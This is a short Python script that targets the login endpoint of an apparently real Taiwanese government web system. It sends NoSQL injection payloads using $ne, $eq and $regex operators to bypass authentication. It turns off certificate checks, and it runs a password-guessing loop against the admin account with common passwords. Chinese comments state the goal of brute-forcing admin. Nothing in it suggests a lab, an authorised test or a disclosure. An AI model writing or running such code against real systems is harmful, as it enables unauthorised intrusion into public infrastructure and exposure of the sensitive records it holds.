import requests, json, urllib3, time
urllib3.disable_warnings()
BASE="https://epcr.tpf.gov.tw:4004"
def login(body,tag):
    s=requests.Session(); s.verify=False; s.headers.update({"User-Agent":"Mozilla/5.0"})
    s.get(BASE+"/captcha",timeout=12)
    try:
        r=s.post(BASE+"/login",json=body,timeout=12); return r.status_code, r.text
    except Exception as e: return None, repr(e)

print("=== 0 文档匹配 (不存在的宽泛值) ===")
tests={
  "username=$eq:ZzzZ": {"username":{"$eq":"ZzzZz999"},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"},
  "username=impossible": {"username":"ZzzZz999","password":"x","captcha":"1","domain":"AUTH_SERVER"},
  "both $eq": {"username":{"$eq":"Zzz"},"password":{"$eq":"Zzz"},"captcha":"1","domain":"AUTH_SERVER"},
  "$regex no match": {"username":{"$regex":"^Zzz$"},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"},
}
for tag,b in tests.items():
    code,t=login(b,tag)
    print(f"  {tag:20s} -> {code} | {t[:70]}")
    time.sleep(0.1)
print("\n=== 403 路径 + 正确密码爆破 admin (找非403/非500) ===")
# 用 $ne 走 403 路径, 不同密码
for pw in ["admin","password","123456","admin123","tpf2024","epcr2024","P@ssw0rd","admin@123"]:
    b={"username":{"$ne":None},"password":pw,"captcha":"1","domain":"AUTH_SERVER"}
    code,t=login(b,pw)
    mark=" ***" if code not in (403,500) else ""
    print(f"  pw={pw:12s} -> {code} | {t[:55]}{mark}")
    time.sleep(0.1)
print("DONE")
